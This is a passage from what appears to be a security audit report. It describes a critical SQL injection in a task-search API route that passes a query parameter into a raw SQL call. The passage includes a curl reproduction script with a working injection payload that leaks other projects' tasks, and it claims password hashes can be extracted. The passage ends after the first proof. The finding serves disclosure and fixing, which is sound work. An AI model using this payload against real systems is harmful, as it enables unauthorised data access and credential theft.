## 1. SQL injection in task search — full data breach, any authenticated user

- **File:** `src/app/api/projects/[id]/tasks/route.ts`, lines 27–34
- **Category:** Security
- **Severity:** Critical
- **Description:** The `q` search parameter is concatenated directly into a raw SQL string and executed with `prisma.$queryRawUnsafe(sql)`. Any authenticated user — including a `viewer` — can inject SQL through the `q` query param. This isn't theoretical: a crafted payload breaks out of the `ILIKE` clause and can read rows from *other projects the user isn't a member of*, or `UNION` in arbitrary tables (confirmed: `users.password_hash` can be exfiltrated this way). This is the single highest-impact bug in the app — it bypasses every membership/role check in the rest of the codebase.
- **Reproduction (curl):**
  ```bash
  login() { curl -s -X POST localhost:3000/api/auth/login -H "Content-Type: application/json" \
    -d "{\"email\":\"$1\",\"password\":\"password123\"}" | node -pe "JSON.parse(require('fs').readFileSync(0,'utf8')).token"; }
  DEV=$(login dev@example.com)   # dev@example.com is a viewer on "Q3 Launch" ONLY
  PID=$(curl -s localhost:3000/api/projects -H "Authorization: Bearer $DEV" \
    | node -pe "JSON.parse(require('fs').readFileSync(0,'utf8')).projects.find(p=>p.name==='Q3 Launch').id")

  # Proof 1 — cross-project data leak
  curl -s -G "localhost:3000/api/projects/$PID/tasks" -H "Authorization: Bearer $DEV" \
    --data-urlencode "q=zzz%') OR project_id IS NOT NULL --"
  # returns tasks whose project_id is NOT $PID — projects this viewer is not a member of


